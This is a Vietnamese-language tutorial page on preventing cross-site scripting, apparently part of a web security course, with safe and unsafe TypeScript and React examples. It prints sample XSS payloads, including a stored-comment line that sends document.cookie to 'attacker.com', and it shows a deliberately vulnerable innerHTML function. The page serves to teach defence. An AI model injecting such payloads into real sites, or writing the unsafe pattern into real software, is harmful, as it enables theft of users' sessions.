# 🛡️ 5.4.3 XSS Prevention (Phòng Chống Cross-Site Scripting)

> **XSS** là tấn công chèn mã độc JavaScript vào trang web, thực thi trên browser của victim.

---

## 🎯 Vấn đề

```
❌ XSS Attack Flow
┌──────────┐      ┌──────────┐      ┌──────────┐
│ Attacker │      │  Server  │      │  Victim  │
│          │      │          │      │          │
│ 1. Gửi   │─────▶│          │      │          │
│    comment│     │ Lưu vào  │─────▶│ 3. Trang │
│    độc hại│     │ DB       │      │   load   │
│          │      │          │      │   HTML   │
│          │      │          │◀─────│          │
│          │      │          │      │ 4. JS     │
│          │      │          │      │   chạy!   │
│          │      │          │      │  → Cookie │
│          │      │          │      │  → Token  │
└──────────┘      └──────────┘      └──────────┘
```

**Cú pháp tấn công:**
```html
<!-- stored trong comment -->
<input onfocus="fetch('https://attacker.com/?cookie='+document.cookie)">
```

---

## 🧩 3 Loại XSS

```
┌─────────────────────────────────────────────────────────┐
│  1. Reflected XSS                                       │
│     ─ Code độc nằm trong URL/response                 │
│     ─ Victim phải click link độc                       │
│     Ví dụ: search?q=<script>alert(1)</script>          │
│                                                         │
│  2. Stored XSS                                         │
│     ─ Code độc lưu vào DB, hiển thị cho mọi user       │
│     ─ Nguy hiểm nhất!                                  │
│     Ví dụ: comment có chứa script                      │
│                                                         │
│  3. DOM-based XSS                                      │
│     ─ Thực thi trực tiếp trong browser (client-side)   │
│     ─ Không cần server response                        │
│     Ví dụ: document.getElementById('output').innerHTML  │
│                  = window.location.hash;                │
└─────────────────────────────────────────────────────────┘
```

---

## 💻 Code ví dụ

Xem đầy đủ: [`examples/index.ts`](examples/index.ts)

```typescript
// ===== ❌ DANGEROUS: Render raw HTML =====
function renderComment(html: string): HTMLElement {
  const el = document.getElementById('comment');
  el.innerHTML = html; // ❌ Script sẽ chạy!
}
renderComment('<img src=x onerror="alert(document.cookie)">');

// ===== ✅ SAFE: Escape text =====
function renderCommentSafe(text: string): HTMLElement {
  const el = document.getElementById('comment');
  el.textContent = text; // ✅ Chỉ hiển thị text
}
renderCommentSafe('<img src=x onerror="alert(document.cookie)">');

// ===== ✅ SAFE: Sanitize HTML (cho phép một số tag) =====
import DOMPurify from 'dompurify';

function renderSanitized(html: string): HTMLElement {
  const el = document.getElementById('comment');
  el.innerHTML = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href', 'title']
  });
}
```

**React tự động escape:**
```tsx
// React ✅ an toàn
const Comment = ({ text }: { text: string }) => (
  <div>{text}</div> // Tự động escape HTML
);

// React ⚠️ nguy hiểm
const CommentDangerous = ({ html }: { html: string }) => (
  <div dangerouslySetInnerHTML={{ __html: html }} /> // ❌
);
```

---

## ✅ Ưu điểm

| Ưu điểm | Giải thích |
|---------|------------|
| 🛡️ Bảo vệ user data | Ngăn đánh cắp cookie/session |
| 🌐 Universal | Áp dụng được cho mọi framework |
| 💡 Dễ implement | Escape/output encoding là cơ bản |
| 🔒 Multiple layers | CSP + escape + validation |

---

## ⚠️ Nhược điểm

| Nhược điểm | Cách xử lý |
|------------|------------|
| 🔴 Sanitize complex HTML | Dùng library như DOMPurify |
| 🟡 CSP conflict | Cấu hình CSP cẩn thận |
| 🟡 Performance overhead | Cache kết quả sanitize |

---

## 🎯 Khi nào dùng technique nào?

| Scenario | Technique |
|----------|-----------|
| Hiển thị user input dạng text | ✅ textContent/escape |
| Hiển thị HTML từ user (forum, blog) | ✅ DOMPurify sanitize |
| React/Vue application | ✅ Framework auto-escape |
| Extra security layer | ✅ Content Security Policy |
| Input validation | ✅ Sanitize trước khi lưu DB |

---

## 🔗 Liên quan

- **5.4.1 JWT** — XSS có thể steal JWT token
- **5.4.4 CSRF Protection** — XSS + CSRF = devastating combo
- **5.4.5 OWASP Top 10** — XSS luôn trong top 3

---

## 📚 Tài liệu tham khảo

- 📖 [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- 📖 [DOMPurify Docs](https://github.com/cure53/DOMPurify)
- 📖 [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

## ⏭️ Bài tiếp theo

→ [5.4.4 CSRF Protection](../5.4.4-csrf-protection/README.md)
